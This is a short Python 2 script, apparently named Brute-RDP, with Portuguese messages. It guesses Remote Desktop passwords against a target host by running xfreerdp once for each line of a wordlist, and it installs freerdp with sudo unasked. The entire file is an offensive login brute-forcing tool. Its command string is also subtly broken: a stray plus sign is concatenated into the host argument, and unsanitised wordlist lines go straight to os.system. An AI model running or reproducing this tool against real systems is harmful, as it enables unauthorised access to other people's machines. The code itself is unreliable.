#!/usr/bin/python
# -*- coding: utf-8 -*-
#@AUTHOR: joao-b4
import sys,time,os
try:
    if len(sys.argv) < 4:
        print"Sintaxe: python Brute-RDP <Host> <Username> <Wordlist> \n\nEX: python Brute-RDP 192.168.1.5 admin wordlist.txt"
    else:
        #@host received ip
        #@user received username
        #@port received port
        #@file received wordlist
        host = sys.argv[1]
        port = '3389'
        user = sys.argv[2]  
        file = open(sys.argv[3])      
              
        #install xfreerdp
        
        os.system("sudo apt-get install freerdp-x11 -y")
        os.system("clear")
        for xpass in file.readlines():
            print "\n\nTestando Senha: ",xpass
            teste = "xfreerdp /u:"+user+" /v:"+host+":"+port+"+/p:"+xpass+" "
            os.system(teste)
except Exception as erro:
    #exception's
    print("Erro ocorrido: ",erro)
    time.sleep(3)
    sys.exit()
except KeyboardInterrupt:
    #exception ^C
    print("\nfim do programa...")
    time.sleep(3)
    sys.exit()
